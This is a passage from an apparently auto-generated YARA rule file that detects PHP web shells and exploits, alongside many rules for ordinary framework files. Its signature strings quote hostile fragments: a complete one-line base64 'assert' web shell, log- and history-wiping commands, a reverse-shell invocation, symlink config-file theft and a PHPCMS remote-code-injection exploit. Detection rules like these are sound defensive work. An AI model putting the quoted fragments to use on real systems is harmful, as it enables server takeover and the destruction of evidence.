      $x16 = "symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');" fullword ascii
      $x17 = "symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $x18 = "symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $x19 = "symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
      $x20 = "symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1000KB and
      1 of ($x*)
}

rule PimcoreBundleInterface
{
   meta:
      description = "php22 - file PimcoreBundleInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "108b629f71e91482d586f3b97cc6926506f699620b215054b9dd3f1656e1d0be"
   strings:
      $s1 = "* Get javascripts to include in editmode" fullword ascii
      $s2 = "* Get javascripts to include in admin interface" fullword ascii
      $s3 = "* If the bundle has an installation routine, an installer is responsible of handling installation related tasks" fullword ascii
      $s4 = "* Strings will be directly included, RouteReferenceInterface objects are used to generate an URL through the" fullword ascii
      $s5 = "* Get path to include in admin iframe" fullword ascii
      $s6 = "use Symfony\\Component\\HttpKernel\\Bundle\\BundleInterface;" fullword ascii
      $s7 = "* Get stylesheets to include in editmode" fullword ascii
      $s8 = "* Get stylesheets to include in admin interface" fullword ascii
      $s9 = "* Bundle description as shown in extension manager" fullword ascii
      $s10 = "* Bundle version as shown in extension manager" fullword ascii
      $s11 = "* Bundle name as shown in extension manager" fullword ascii
      $s12 = "* @return string[]|RouteReferenceInterface[]" fullword ascii
      $s13 = "* @return string|RouteReferenceInterface|null" fullword ascii
      $s14 = "public function getAdminIframePath();" fullword ascii
      $s15 = "* @return InstallerInterface|null" fullword ascii
      $s16 = "public function getEditmodeCssPaths();" fullword ascii
      $s17 = "public function getEditmodeJsPaths();" fullword ascii
      $s18 = "* router." fullword ascii
      $s19 = "public function getJsPaths();" fullword ascii
      $s20 = "public function getInstaller();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule RequestMembershipForm
{
   meta:
      description = "php22 - file RequestMembershipForm.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1b6b7403d594fa958665cdb3651d6a8ab6741a071d1f5cbdd387fc7cbab7a090"
   strings:
      $s1 = "* If not declared here, an attribute would have a label that is" fullword ascii
      $s2 = "* @package humhub.modules_core.space.forms" fullword ascii
      $s3 = "* Declares customized attribute labels." fullword ascii
      $s4 = "* Declares the validation rules." fullword ascii
      $s5 = "* @author Luke" fullword ascii
      $s6 = "* the same as its name with the first letter in upper case." fullword ascii
      $s7 = "namespace humhub\\modules\\space\\models\\forms;" fullword ascii
      $s8 = "'message' => Yii::t('SpaceModule.forms_SpaceMembershipForm', 'Application message')," fullword ascii
      $s9 = "public function attributeLabels()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule PHPRemoteView_3
{
   meta:
      description = "php22 - file PHPRemoteView_3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "22cbc316412a0433daa8d33cd812a0f41102508bb013182c82d40e2fca430f0c"
   strings:
      $x1 = "*  - executing any shell commands and any PHP-code" fullword ascii
      $x2 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\\n\");" fullword ascii
      $x3 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>\\n\");" fullword ascii
      $x4 = "*  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $x5 = "*  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)" fullword ascii
      $x6 = "$system_access=true;     // true - user (you) may be run shell commands" fullword ascii
      $s7 = "*             add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $s8 = "*  Free download from http://php.spb.ru/remview/" fullword ascii
      $s9 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) && !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) " fullword ascii
      $s10 = "$HTTP_SERVER_VARS['PHP_AUTH_USER']!=$login || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)) {" fullword ascii
      $s11 = "$phpeval_access=true;    // true - user (you) may be execute any php-code" fullword ascii
      $s12 = "*  2003.04.22 read first 64Kb of null-size file (example: /etc/zero), " fullword ascii
      $s13 = "*  - download any file and open on Notepad" fullword ascii
      $s14 = "$host_allow=array(\"*\");  // Type list of your(allow) hosts. All other - denied." fullword ascii
      $s15 = "if ($login!==false && (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || " fullword ascii
      $s16 = "*  (c) Dmitry Borodin, dima@php.spb.ru, http://php.spb.ru" fullword ascii
      $s17 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']); " fullword ascii
      $s18 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']); " fullword ascii
      $s19 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']); " fullword ascii
      $s20 = "// antofix 'register globals': $HTTP_GET/POST_VARS -> normal vars;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule preview_pane
{
   meta:
      description = "php22 - file preview_pane.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4509f16fc6782121cf99c2a56d69d8d46e92f3b921af3a56bc69cc18f941f3d9"
   strings:
      $s1 = "defined('C5_EXECUTE') or die('Access Denied.');" fullword ascii
      $s2 = "$customTopicAttributeKeyHandle = $controller->get('customTopicAttributeKeyHandle');" fullword ascii
      $s3 = "$_REQUEST['cParentID'] = ($_REQUEST['cParentID'] == 'OTHER') ? $_REQUEST['cParentIDValue'] : $_REQUEST['cParentID'];" fullword ascii
      $s4 = "$nh = Loader::helper('navigation');" fullword ascii
      $s5 = "$customTopicTreeNodeID = $controller->get('customTopicTreeNodeID');" fullword ascii
      $s6 = "$request->setCurrentPage(Page::getByID($_REQUEST['current_page']));" fullword ascii
      $s7 = "$controller->includeDescription = $_REQUEST['includeDescription'];" fullword ascii
      $s8 = "$controller->customTopicAttributeKeyHandle = $_REQUEST['customTopicAttributeKeyHandle'];" fullword ascii
      $s9 = "$controller->relatedTopicAttributeKeyHandle = $_REQUEST['relatedTopicAttributeKeyHandle'];" fullword ascii
      $s10 = "$_REQUEST['cThis'] = ($_REQUEST['cParentID'] == $_REQUEST['current_page']) ? '1' : '0';" fullword ascii
      $s11 = "$controller->filterByCustomTopic = ($_REQUEST['topicFilter'] == 'custom') ? '1' : '0';" fullword ascii
      $s12 = "extract($controller->getSets());" fullword ascii
      $s13 = "$request = Request::getInstance();" fullword ascii
      $s14 = "$pages = $controller->get('pages');" fullword ascii
      $s15 = "$controller->customTopicTreeNodeID = $_REQUEST['customTopicTreeNodeID'];" fullword ascii
      $s16 = "$controller->enableExternalFiltering = $_REQUEST['enableExternalFiltering'];" fullword ascii
      $s17 = "$controller->includeAllDescendents = $_REQUEST['includeAllDescendents'];" fullword ascii
      $s18 = "$controller->displayFeaturedOnly = $_REQUEST['displayFeaturedOnly'];" fullword ascii
      $s19 = "$_REQUEST['num'] = ($_REQUEST['num'] > 0) ? $_REQUEST['num'] : 0;" fullword ascii
      $s20 = "$_REQUEST['filterDateDays'] = $_REQUEST['filterDatePast'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule php22_phpcms
{
   meta:
      description = "php22 - file phpcms.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4488ecf728f3ff7fd3c733bd9b14f5182be08e0877ed7c9f0d5fad77c5eec389"
   strings:
      $x1 = "PHPCMS Remote Code Inject GetShell Exploit" fullword ascii
      $s2 = "$payload .= \"User-Agent: Payb-Agent\\r\\n\"; " fullword ascii
      $s3 = "$content=httpRequestGET(\"/yp/shell.php\");" fullword ascii
      $s4 = "echo \"[+] Webshell:http://$host{$path}yp/shell.php\\n\";" fullword ascii
      $s5 = "$returnstr=httpRequestGET('/yp/product.php?view_type=1&catid=&pagesize={${phpinfo()}}&areaname=&order=');" fullword ascii
      $s6 = "$payload .= \"Host: \" . $host . \"\\r\\n\"; " fullword ascii
      $s7 = "$payload = $method.\" \".$path.$url.\" HTTP/1.1\\r\\n\";" fullword ascii
      $s8 = "$payload .= \"Connection: Close\\r\\n\\r\\n\"; " fullword ascii
      $s9 = "$fp = fsockopen(gethostbyname($host), 80);" fullword ascii
      $s10 = "host:      target server (ip/hostname)" fullword ascii
      $s11 = "Usage: php '.$argv[0].' host path" fullword ascii
      $s12 = "$payload .= \"Accept: */*\\r\\n\"; " fullword ascii
      $s13 = "exit(\"[-] Exploit Failed! This site has No Bug!\\n\");" fullword ascii
      $s14 = "php '.$argv[0].' localhost /phpcms/" fullword ascii
      $s15 = "echo(\"[+] This site has Bug!We Will Be Try To Exploit It\\n\");" fullword ascii
      $s16 = "function httpRequestGET($url){" fullword ascii
      $s17 = "exit(\"[-] Exploit Failed!\\n\");" fullword ascii
      $s18 = "fputs($fp, $payload);" fullword ascii
      $s19 = "EXP Getshell" fullword ascii
      $s20 = "GETWebshell" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule place_blade
{
   meta:
      description = "php22 - file place.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "49304e2f23691a0f5a2b225dc97bb1d63e60188f406e9cc1e6c5d57d9c70cee8"
   strings:
      $x1 = "$.getScript(\"https://maps.googleapis.com/maps/api/js?libraries=places&key={{config('services.google.maps.key')}}\", f" fullword ascii
      $s2 = "$.getScript(\"https://maps.googleapis.com/maps/api/js?libraries=places&key={{config('services.google.maps.key')}}\", function ()" ascii
      $s3 = "var map = new google.maps.Map(document.getElementById('map-place-{{$slug}}-{{$lang}}-canvas'), {" fullword ascii
      $s4 = "data-target=\"#map-place-{{$slug}}-{{$lang}}\"><i" fullword ascii
      $s5 = "autocomplete{{$slug}}{{$lang}}.addListener('place_changed', function () {" fullword ascii
      $s6 = "document.documentElement.addEventListener(\"googleMapsLoad\", function(e) {" fullword ascii
      $s7 = "<div class=\"modal fade\" id=\"map-place-{{$slug}}-{{$lang}}\" tabindex=\"-1\" role=\"dialog\"" fullword ascii
      $s8 = "var input = document.getElementById(\"place-{{$slug}}-{{$lang}}\");" fullword ascii
      $s9 = "var autocomplete{{$slug}}{{$lang}} = new google.maps.places.Autocomplete(input);" fullword ascii
      $s10 = "document.addEventListener('turbolinks:load', function() {" fullword ascii
      $s11 = "var cors = autocomplete{{$slug}}{{$lang}}.getPlace().geometry.location;" fullword ascii
      $s12 = "document.documentElement.dispatchEvent(new Event(\"googleMapsLoad\"));" fullword ascii
      $s13 = "<input type=\"hidden\" id=\"lng-{{$slug}}-{{$lang}}\" name=\"{{$inputname}}[lng]\"" fullword ascii
      $s14 = "<input type=\"hidden\" id=\"lat-{{$slug}}-{{$lang}}\" name=\"{{$inputname}}[lat]\"" fullword ascii
      $s15 = "<!-- Modal  -->" fullword ascii
      $s16 = "lng: parseFloat($('#lng-{{$slug}}-{{$lang}}').val())" fullword ascii
      $s17 = "lat: parseFloat($('#lat-{{$slug}}-{{$lang}}').val())," fullword ascii
      $s18 = "$('#map-place-{{$slug}}-{{$lang}}').on('show.bs.modal', function () {" fullword ascii
      $s19 = "@include('dashboard::partials.fields.hr', ['show' => $hr ?? true])" fullword ascii
      $s20 = "if (window.google === undefined || window.google.maps === undefined) {" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 10KB and
      1 of ($x*) and 4 of them
}


rule php22_poison
{
   meta:
      description = "php22 - file poison.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "950c0bc99365a43e13795a63f24100d5dcc0549245f31a3a68f58e8cc41c1906"
   strings:
      $x1 = "nd / -name log* -exec rm -rf {} \\;', 'find / -name  *.log -exec rm -rf {} \\;', 'unset HISTFILE', 'unset SAVEHIST');" fullword ascii
      $x2 = "<td>Target : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=idiot value=target@hotmail.com size=44><tr>" fullword ascii
      $x3 = "$comandos = array('find / -name *.bash_history -exec rm -rf {} \\;', 'find / -name *.bash_logout -exec rm -rf {} \\;', 'fi" fullword ascii
      $x4 = "$link = \"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=\" . $verdad . \"&filter_exploit_tex" fullword ascii
      $x5 = "$conexion = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']) or die(\"<h1>Error</h1>\");" fullword ascii
      $x6 = "$tod = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']) or die(\"<h1>Error</h1>\");" fullword ascii
      $x7 = "echo \"<title>\" . $_SERVER[\"SERVER_NAME\"] . \" - PoisonShell</title>\";" fullword ascii
      $x8 = "$comandos = array('find / -name *.bash_history -exec rm -rf {} \\;', 'find / -name *.bash_logout -exec rm -rf {} \\;', 'find / -" ascii
      $x9 = "echo '<meta http-equiv=\"refresh\" content=\"0;URL=?serverftp=' . $_GET['serverftp'] . \"&user=\" . $_GET['user'] . \"&pas" fullword ascii
      $x10 = "<td>FakeMail : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=falso value=lagarto@juancho.com size=44><tr>" fullword ascii
      $x11 = "echo \"<b>Web : </b><input type=text size=40 name=proxy value=http://localhost/sql.php><input type=submit value=Get>\";" fullword ascii
      $s12 = "if (!system(\"cd /tmp;perl back.pl \" . $_GET['ipar'] . \" \" . $_GET['portar'])) {" fullword ascii
      $s13 = "if ($mysql = @mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password'])) {" fullword ascii
      $s14 = "$paths = array(\"/var/log/lastlog\", \"/var/log/telnetd\", \"/var/run/utmp\", \"/var/log/secure\", \"/root/.ksh_history\", \"/ro" ascii
      $s15 = "$tod = @mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']);" fullword ascii
      $s16 = "$mysql = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']);" fullword ascii
      $s17 = "system(\"cmd.exe\");" fullword ascii
      $s18 = "echo \"<center><table><tr><td class=main><br><h2>&nbsp;&nbsp;&nbsp;PoisonShell&nbsp;&nbsp;&nbsp;</h2><br></td><td class=main>" fullword ascii
      $s19 = "$link = \"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=\" . $verdad . \"&filter_exploit_text" ascii
      $s20 = "if ($dentro = @ftp_login($enter, $_GET['user'], $_GET['pass'])) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and all of them
}

rule OrderCalculateEvent
{
   meta:
      description = "php22 - file OrderCalculateEvent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e4a4650e666301fdae8c11608e06cafea266db27a98782334fadbc2a3925eb93"
   strings:
      $s1 = "* @package app\\modules\\shop\\events" fullword ascii
      $s2 = "* @property float $price" fullword ascii
      $s3 = "* @property Order $order" fullword ascii
      $s4 = "* Class OrderCalculateEvent" fullword ascii
      $s5 = "use app\\modules\\core\\events\\SpecialEvent;" fullword ascii
      $s6 = "use app\\modules\\shop\\models\\Order;" fullword ascii
      $s7 = "namespace app\\modules\\shop\\events;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_once01
{
   meta:
      description = "php22 - file once01.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a51766ab6470e2fcb0a314aac36f2965b8be40ed600caffef3577653c454bcf7"
   strings:
      $s1 = "<?php $x=base64_decode(\"YXNzZXJ0\");$x($_POST['c']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_php1
{
   meta:
      description = "php22 - file php1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2b28499fc5ed0f8420ce310ffe32858a5b439ec079203b55e0de10b99e68274f"
   strings:
      $s1 = "$myurl='http://www.zjjv.com';//" fullword ascii
      $s2 = "3Ve+sKNHLuFtP/zpe//hhf/5u78oz+WUKhZyE3elrl4bY70xuT" fullword ascii
      $s3 = "QaOkHSwetBfjpSHLfdrSwGrITkAl4NeAYWB5ANEYeQOMCsMK1Q" fullword ascii
      $s4 = "RvL60vXjRv6pjwLzGPfe/LbsOcvl3fbNi92bSxv5Ztg8dLl5Kd" fullword ascii
      $s5 = "OpqdXVfCBZfjRPdni1iYFZOX/xBHlogZFnrjYJyhpjWvrkoKnc" fullword ascii
      $s6 = "4FMGIYk6p4Vbyu9+wAfTPpb+dfaQ79Hvwe/g4aPaCO/oj4mLL5" fullword ascii
      $s7 = "wIui+t/gBcsvHkJCFZcEQxxlRSugfVjXA/hIzkRjFRLogykm2S" fullword ascii
      $s8 = "oMM5VHOcvAi+ndbMaMqmfGEtsEXIgT7lrzsB1w4jQFfUHzZ65A" fullword ascii
      $s9 = "4NCJOhINHlxJp8Md5iWwGZPCYDlgGBuUJN6bDNhnsADlLve8Iq" fullword ascii
      $s10 = "0A5kXzBtazYaHXtkUgEtigSd1KbR00grmOksD1vRTL2g8sw3d8" fullword ascii
      $s11 = "V8wjiGcpu0JkBzps8H80MZDk8U5lkLdsx9JghqWvdjusPyJAi6" fullword ascii
      $s12 = "bu2JKD2QLRAR9aHrN30RGaGTNih34JBlPDAfVnLlOGMXA3tpNU" fullword ascii
      $s13 = "$password='admin';//" fullword ascii
      $s14 = "kEyQQIaCKTh4GfBa17bQLDFdpkPLcTDT0NsxeKGThRnWpUkmCU" fullword ascii
      $s15 = "rFEOVkarrI8w8POkqzzMtMpu/0LXZS9EruVfJMFKqj+I7GmGsG" fullword ascii
      $s16 = "bbpc4BGEWQrRBgnk+FEauyH0b1nvnoF1b+tport2aIApeA4++U" fullword ascii
      $s17 = "4CsAJ+jcHSQq4Wg2kpbfC2kEyXjgyQai5TMmLIxcNPgno8oHBb" fullword ascii
      $s18 = "B0FbaFtmPmmgZ3s0NQE9OPmTxojoHgUMvoygzi4dEg3KTPdObA" fullword ascii
      $s19 = "ravd5p89RCOmDLWa/acU1OBrRcXXK9oliP/pUsON3cWVWOPNKD" fullword ascii
      $s20 = "ndRUNyt2jJZynKtQxKCd2umkg5Eoj5ct3jk/rbQx4mt+j5omVf" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule OrderItemUnitsTaxesApplicator
{
   meta:
      description = "php22 - file OrderItemUnitsTaxesApplicator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2dcbe3c58d205fed03d38c740eecb06d82c189bdeae1b9c0e5007f6465414529"
   strings:
      $s1 = "$this->addTaxAdjustment($unit, (int) $taxAmount, $taxRate->getLabel(), $taxRate->isIncludedInPrice());" fullword ascii
      $s2 = "private function addTaxAdjustment(OrderItemUnitInterface $unit, int $taxAmount, string $label, bool $included): void" fullword ascii
      $s3 = "$taxRate = $this->taxRateResolver->resolve($item->getVariant(), ['zone' => $zone]);" fullword ascii
      $s4 = "* @param AdjustmentFactoryInterface $adjustmentFactory" fullword ascii
      $s5 = "* @param TaxRateResolverInterface $taxRateResolver" fullword ascii
      $s6 = "use Sylius\\Component\\Addressing\\Model\\ZoneInterface;" fullword ascii
      $s7 = "* @var AdjustmentFactoryInterface" fullword ascii
      $s8 = "* @param OrderItemUnitInterface $unit" fullword ascii
      $s9 = "use Sylius\\Component\\Order\\Factory\\AdjustmentFactoryInterface;" fullword ascii
      $s10 = "use Sylius\\Component\\Taxation\\Resolver\\TaxRateResolverInterface;" fullword ascii
      $s11 = "* @var TaxRateResolverInterface" fullword ascii
      $s12 = "use Sylius\\Component\\Core\\Model\\AdjustmentInterface;" fullword ascii
      $s13 = "use Sylius\\Component\\Core\\Model\\OrderItemUnitInterface;" fullword ascii
      $s14 = "* @param bool $included" fullword ascii
      $s15 = "->createWithData(AdjustmentInterface::TAX_ADJUSTMENT, $label, $taxAmount, $included)" fullword ascii
      $s16 = "* @param int $taxAmount" fullword ascii
      $s17 = "foreach ($order->getItems() as $item) {" fullword ascii
      $s18 = "foreach ($item->getUnits() as $unit) {" fullword ascii
      $s19 = "$taxAmount = $this->calculator->calculate($unit->getTotal(), $taxRate);" fullword ascii
      $s20 = "* @param CalculatorInterface $calculator" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule PostController
{
   meta:
      description = "php22 - file PostController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e8be81d7dbb7833e84e49e22d5e39e4d58d35b2c2f55549161bbd551b2efc00"
   strings:
      $x1 = "RemoteFileDownloader::attachFiles($post, $post->message);" fullword ascii
      $s2 = "* @license https://www.humhub.com/licences" fullword ascii
      $s3 = "return \\humhub\\modules\\content\\widgets\\WallCreateContentForm::create($post, $this->contentContainer);" fullword ascii
      $s4 = "class PostController extends \\humhub\\modules\\content\\components\\ContentContainerController" fullword ascii
      $s5 = "if (isset(Yii::app()->params['attachFilesByUrlsToContent']) && Yii::app()->params['attachFilesByUrlsToContent'] == true) {" fullword ascii
      $s6 = "if (!$this->contentContainer->getPermissionManager()->can(new \\humhub\\modules\\post\\permissions\\CreatePost())) {" fullword ascii
      $s7 = "if (isset(Yii::app()->params['attachFilesByUrlsToContent']) && Yii::app()->params['attachFilesByUrlsToContent'] == tru" fullword ascii
      $s8 = "* @package humhub.modules_core.post.controllers" fullword ascii
      $s9 = "* @link https://www.humhub.org/" fullword ascii
      $s10 = "return $this->renderAjaxContent($model->getWallOut());" fullword ascii
      $s11 = "* @copyright Copyright (c) 2015 HumHub GmbH & Co. KG" fullword ascii
      $s12 = "return $this->renderAjax('edit', ['post' => $model, 'edited' => $edited]);" fullword ascii
      $s13 = "// Reload record to get populated updated_at field" fullword ascii
      $s14 = "$post->message = \\Yii::$app->request->post('message');" fullword ascii
      $s15 = "namespace humhub\\modules\\post\\controllers;" fullword ascii
      $s16 = "if ($model->load(Yii::$app->request->post())) {" fullword ascii
      $s17 = "use humhub\\modules\\post\\models\\Post;" fullword ascii
      $s18 = "$model = Post::findOne(['id' => $id]);" fullword ascii
      $s19 = "$id = Yii::$app->request->get('id');" fullword ascii
      $s20 = "public function actionPost()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule queue_sqlite
{
   meta:
      description = "php22 - file queue_sqlite.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3c531d2304ee288f10a495082721e8437a613a49f6c2736e90a8b238c1ab2b0d"
   strings:
      $s1 = "-- --------------------------------------------------------" fullword ascii
      $s2 = "CREATE ROLE queue LOGIN" fullword ascii
      $s3 = "PASSWORD '[CHANGE ME]'" fullword ascii
      $s4 = "FOREIGN KEY (queue_id) REFERENCES queue(queue_id)" fullword ascii
      $s5 = "queue_id INTEGER PRIMARY KEY AUTOINCREMENT," fullword ascii
      $s6 = "message_id INTEGER PRIMARY KEY AUTOINCREMENT," fullword ascii
      $s7 = "-- Table structure for table `message`" fullword ascii
      $s8 = "-- Table structure for table `queue`" fullword ascii
      $s9 = "NOSUPERUSER NOINHERIT NOCREATEDB NOCREATEROLE;" fullword ascii
      $s10 = "Sample grant for SQLite" fullword ascii
      $s11 = "queue_id INTEGER PRIMARY KEY," fullword ascii
      $s12 = "queue_name VARCHAR(100) NOT NULL," fullword ascii
      $s13 = "timeout INTEGER NOT NULL DEFAULT 30" fullword ascii
   condition:
      uint16(0) == 0x2a2f and filesize < 2KB and
      8 of them
}


rule demo_data
{
   meta:
      description = "php22 - file demo-data.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b09cbd356354826057967475a9c0da29a8f074d33926f5254f106cc6ce4098d8"
   strings:
      $s1 = "'link' => 'https://market.yandex.ru/product/10997100/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1871127-PF=2142398356~" fullword ascii
      $s2 = "'link' => 'https://market.yandex.ru/product/10969108/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1871127-PF=2142398356~" fullword ascii
      $s3 = "'link' => 'https://market.yandex.ru/product/10565515/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1871523-PF=2142398356~" fullword ascii
      $s4 = "'link' => 'https://market.yandex.ru/product/10469292/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1871127-PF=2142398356~" fullword ascii
      $s5 = "'link' => 'https://market.yandex.ru/product/12393956/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1870655-PF=2142398356~" fullword ascii
      $s6 = "'link' => 'https://market.yandex.ru/product/10997559/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1870091-PF=2142398356~" fullword ascii
      $s7 = "'link' => 'https://market.yandex.ru/product/11873371/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~9158060-PF=2142398356~" fullword ascii
      $s8 = "'link' => 'https://market.yandex.ru/product/12181013/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1870091-PF=2142398356~" fullword ascii
      $s9 = "'link' => 'https://market.yandex.ru/product/11160827/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~9158060-PF=2142398356~" fullword ascii
      $s10 = "'link' => 'https://market.yandex.ru/product/10988497/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1870655-PF=2142398356~" fullword ascii
      $s11 = "'link' => 'https://market.yandex.ru/product/11872351/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1870655-PF=2142398356~" fullword ascii
      $s12 = "'link' => 'https://market.yandex.ru/product/10829169/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1870091-PF=2142398356~" fullword ascii
      $s13 = "'link' => 'https://market.yandex.ru/product/11007042/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1870655-PF=2142398356~" fullword ascii
      $s14 = "'link' => 'https://market.yandex.ru/product/10565509/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1870655-PF=2142398356~" fullword ascii
      $s15 = "'link' => 'https://market.yandex.ru/product/10830283/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1871127-PF=2142398356~" fullword ascii
      $s16 = "'link' => 'https://market.yandex.ru/product/10998629/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~3598551-PF=2142398356~" fullword ascii
      $s17 = "'link' => 'https://market.yandex.ru/product/12344762/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1870091-PF=2142398356~" fullword ascii
      $s18 = "'link' => 'https://market.yandex.ru/product/11168072/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~3598551-PF=2142398356~" fullword ascii
      $s19 = "'link' => 'https://market.yandex.ru/product/12176478/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~3598551-PF=2142398356~" fullword ascii
      $s20 = "'link' => 'https://market.yandex.ru/product/11552361/?hid=91013&CMD=-RR=0,0,0,0-PF=1801946~EQ~sel~1870655-PF=2142398356~" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 15000KB and
      8 of them
}

rule PermissionKey
{
   meta:
      description = "php22 - file PermissionKey.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b5941e41bd3768976e16d5b21e86fec246ed7a15cfcfdfa932b87d1ef8e4a003"
   strings:
      $s1 = "defined('C5_EXECUTE') or die(\"Access Denied.\");" fullword ascii
      $s2 = "return $key->getPermissionKeyDisplayName();" fullword ascii
      $s3 = "public function getItemName($key)" fullword ascii
      $s4 = "return Key::getListByPackage($package);" fullword ascii
      $s5 = "public function getPackageItems(Package $package)" fullword ascii
      $s6 = "use Concrete\\Core\\Permission\\Key\\Key;" fullword ascii
      $s7 = "use Concrete\\Controller\\Element\\Package\\BlockTypeItemList;" fullword ascii
      $s8 = "use Concrete\\Controller\\Element\\Package\\ThemeItemList;" fullword ascii
      $s9 = "use Concrete\\Core\\Block\\BlockType\\Set;" fullword ascii
      $s10 = "public function getItemCategoryDisplayName()" fullword ascii
      $s11 = "return t('Permission Keys');" fullword ascii
      $s12 = "use Concrete\\Core\\Entity\\Package;" fullword ascii
      $s13 = "namespace Concrete\\Core\\Package\\ItemCategory;" fullword ascii
      $s14 = "class PermissionKey extends AbstractCategory" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule PagerManager
{
   meta:
      description = "php22 - file PagerManager.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d13bb147caad7a3e8cda323a91024cfad92dc40c7c1afad09f57999e9119c994"
   strings:
      $s1 = "use Concrete\\Core\\Support\\Manager as CoreManager;" fullword ascii
      $s2 = "protected function createDashboardDriver()" fullword ascii
      $s3 = "namespace Concrete\\Core\\Search\\Pagination\\View;" fullword ascii
      $s4 = "return new ConcreteBootstrap3PagerView();" fullword ascii
      $s5 = "protected function createApplicationDriver()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_once02
{
   meta:
      description = "php22 - file once02.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "50e94c810749b2c53357efe5cd2160bcc6f45da28f8e715546992a817a164052"
   strings:
